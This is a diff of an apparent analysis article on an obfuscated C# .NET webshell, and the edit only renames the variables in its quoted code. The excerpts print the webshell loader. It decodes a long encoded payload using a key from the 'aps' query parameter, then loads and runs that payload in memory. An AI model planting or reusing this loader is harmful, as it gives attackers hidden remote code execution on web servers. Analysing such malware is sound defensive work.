@@ -54,9 +54,9 @@ This article will explore a specific type of webshell, which is written in C# .N
             if (Request.QueryString["aps"] != null && !string.IsNullOrEmpty(Request.QueryString["aps"]))
             {
                 string xhxeZjRc0R = "xafFpcWCxaLFssWyxb7FssWyxbLFssW2xbLFssWyxbLEnMScxIvFssWyxb/FlMWyxbLFssWyxbLFssWyxbLFssWixbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWUxbLFssWyxbLFssSHxZXFhsWUxIfFssWHxbLFncW9xbrFkcWUxbHFp8W+xIPFm8WlxbTFm8WDxZDFisWxxYTFkMWexIrFncWQxZ7FtcWHxbrFtMW9xZvFkcWexIbFhcWXxbDFscWaxanFoMWxxYrFl8WkxIfFlMWSxaTEh8WUxaHFtsSKxafFusW0xILFhcWpxbTFpsWGxbfFosSDxbjFucWyxbLFssWyxbLFssWyxbLFssWxxaLFocWixbLFssWnxbLFtsW3xbLFtsWbxIvFicWexb7FssWyxbLFssWyxbLFssWyxbLFssW8xbLFssWyxZrFtsW/xbLFosWUxbLFssWxxZTFssWyxbLFssW0xbLFssWyxbLFssWyxbLFssWVxZnFkMWyxbLFssWyxZTFssWyxbLFssWixbLFssWyxbLFssWxxbLFssWyxbLFlMWyxbLFssWyxbLFlMWyxbLFscWyxbLFssWyxbLFssWyxbLFssWyxbbFssWyxbLFssWyxbLFssWyxbLFssWwxbLFssWyxbLFssWyxZTFssWyxbLFssWyxbLFssWyxb7FssWixbrFpsWyxbLFscWyxbLFssWxxbLFssWyxbLFssWyxbbFssWyxbLFtsWyxbLFssWyxbLFssWyxbLFscWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWwxYTEgMWyxbLFscWjxbLFssWyxbLFssW2xbLFssWyxb/FlMWwxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFtMWyxbLFssWyxYTFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFusWyxbLFssWwxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbDFsMWyxbLFssW2xZTFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbDEhsSDxanFq8WbxIPFssWyxbLFssWbxbHFkMWyxbLFssWyxZTFssWyxbLFssW0xbLFssWyxbLFssW6xbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbDFssWyxbLFtMWyxYbFkMWdxb3FisWqxYTFssWyxbLFv8WUxbDFssWyxbLFssWixbLFssWyxbLFssWixbLFssWyxbLFksWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWxxbLFssWyxbHFssW/xZ3FucWfxZHFtMSKxZnFssWyxbLFvsWyxbLFssWyxbLFtMWyxbLFssWyxbLFsMWyxbLFssWyxbvFlMWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWixbLFssWyxaLFlMWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFscWUxb3FhMWyxbLFssWyxbLFssWyxbbFlMWyxbLFssWyxbDFssWyxabFssW7xbDFlMWyxbLFscWyxaPFssWyxbLFscWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxI4=";
-                Assembly oUDpGna3QY = Assembly.Load(Convert.FromBase64String(kOljc0dVRP(Encoding.UTF8.GetString(Convert.FromBase64String(xhxeZjRc0R)), Convert.ToInt32(Request.QueryString["aps"]))));
-                Page ou5ONZ7iYr = (Page)Activator.CreateInstance(oUDpGna3QY.GetTypes()[0]);
-                ou5ONZ7iYr.ProcessRequest(HttpContext.Current);
+                Assembly YQ3anGpDUo = Assembly.Load(Convert.FromBase64String(kOljc0dVRP(Encoding.UTF8.GetString(Convert.FromBase64String(xhxeZjRc0R)), Convert.ToInt32(Request.QueryString["aps"]))));
+                Page rYi7ZNO5uo = (Page)Activator.CreateInstance(YQ3anGpDUo.GetTypes()[0]);
+                rYi7ZNO5uo.ProcessRequest(HttpContext.Current);
             }else
             {
                 Response.TrySkipIisCustomErrors = Convert.ToBoolean(1);
@@ -125,9 +125,9 @@ void Page_Load(object sender, EventArgs e)
             if (Request.QueryString["aps"] != null && !string.IsNullOrEmpty(Request.QueryString["aps"]))
             {
                 string xhxeZjRc0R = "xafFpcWCxaLFssWyxb7FssWyxbLFssW2xbLFssWyxbLEnMScxIvFssWyxb/FLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxI4=";//cut the payload
-                Assembly oUDpGna3QY = Assembly.Load(Convert.FromBase64String(kOljc0dVRP(Encoding.UTF8.GetString(Convert.FromBase64String(xhxeZjRc0R)), Convert.ToInt32(Request.QueryString["aps"]))));
-                Page ou5ONZ7iYr = (Page)Activator.CreateInstance(oUDpGna3QY.GetTypes()[0]);
-                ou5ONZ7iYr.ProcessRequest(HttpContext.Current);
+                Assembly YQ3anGpDUo = Assembly.Load(Convert.FromBase64String(kOljc0dVRP(Encoding.UTF8.GetString(Convert.FromBase64String(xhxeZjRc0R)), Convert.ToInt32(Request.QueryString["aps"]))));
+                Page rYi7ZNO5uo = (Page)Activator.CreateInstance(YQ3anGpDUo.GetTypes()[0]);
+                rYi7ZNO5uo.ProcessRequest(HttpContext.Current);
             }else
             {
                 Response.TrySkipIisCustomErrors = Convert.ToBoolean(1);
@@ -150,9 +150,9 @@ So, if the URL of the current HTTP request is **`http://www.contoso.com/default.
 
 Figure 1: The obfuscated payload
 
-- `Assembly oUDpGna3QY = Assembly.Load(Convert.FromBase64String(kOljc0dVRP(Encoding.UTF8.GetString(Convert.FromBase64String(xhxeZjRc0R)), Convert.ToInt32(Request.QueryString["aps"]))));`
+- `Assembly YQ3anGpDUo = Assembly.Load(Convert.FromBase64String(kOljc0dVRP(Encoding.UTF8.GetString(Convert.FromBase64String(xhxeZjRc0R)), Convert.ToInt32(Request.QueryString["aps"]))));`
 
-In addition, the function creates a new instance object called **`oUDpGna3QY`** from the **`Assembly`** class, which contains the **`Assembly.Load`** method. This method is responsible for loading compiled files, such as .dll and .exe, into memory without modifying the file system. The loaded assembly can be accessed for its metadata and types, and it also allows for dynamic code execution. It loads the payload from memory.
+In addition, the function creates a new instance object called **`YQ3anGpDUo`** from the **`Assembly`** class, which contains the **`Assembly.Load`** method. This method is responsible for loading compiled files, such as .dll and .exe, into memory without modifying the file system. The loaded assembly can be accessed for its metadata and types, and it also allows for dynamic code execution. It loads the payload from memory.
 
 However, by breaking down the obfuscated payload into parts, it becomes easier to understand:
 
